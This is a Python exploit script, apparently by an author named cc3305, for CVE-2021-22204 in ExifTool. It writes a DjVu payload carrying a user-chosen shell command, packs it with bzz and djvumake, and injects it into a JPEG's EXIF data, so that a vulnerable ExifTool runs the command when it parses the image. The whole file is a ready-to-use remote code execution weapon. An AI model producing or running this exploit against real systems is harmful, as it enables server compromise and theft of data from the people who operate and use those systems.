#!/usr/bin/env python3
import argparse
import subprocess

# Global variable for the args
args = None

def parse_args() -> argparse.Namespace:
    """
    Returns the parsed arguments passed in via argparse
    Required arguments are marked by a star (*)

    @return: the parsed args
    """

    parser = argparse.ArgumentParser(description="CVE-2021-22204 exploit script by cc3305")

    # OPTIONAL: Path to image, default: malicious_image.jpg
    parser.add_argument("-i", "--image", help="Path to image file", default="malicious_image.jpg")
    # NECESSARY: Command which should be run when the exploit fired
    parser.add_argument("-C", "--command", action="store", help="* Command to run")
    
    # Return the parsed args
    result = parser.parse_args()
    
    # Check if the required flags are set
    if(result.command):
        return result

    # If not print the help and exit
    print("Not all required arguments are set, required arguments are marked by a star(*)")
    parser.print_help()
    exit()

def run_exploit():
    """
    Where most of the magic happens

    @return: True if the exploit was successful, False if not
    """
    payload = f"(metadata \"\c${{system('{args.command}')}};\")".encode()

    payload_file = open("payload", "w")
    payload_file.write(payload.decode("utf-8"))
    payload_file.close()

    subprocess.run(['bzz', 'payload', 'payload.bzz'])
    subprocess.run(['djvumake', 'malicious.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
    subprocess.run(['exiftool', '-config', 'configfile', '-q', '-HasselbladExif<=malicious.djvu', args.image]) 

    print(f"Created malicious image file `{args.image}` with payload `{args.command}`")
    return

# Entrypoint, this gets executed first
if __name__ == "__main__":
    args = parse_args()
    run_exploit()


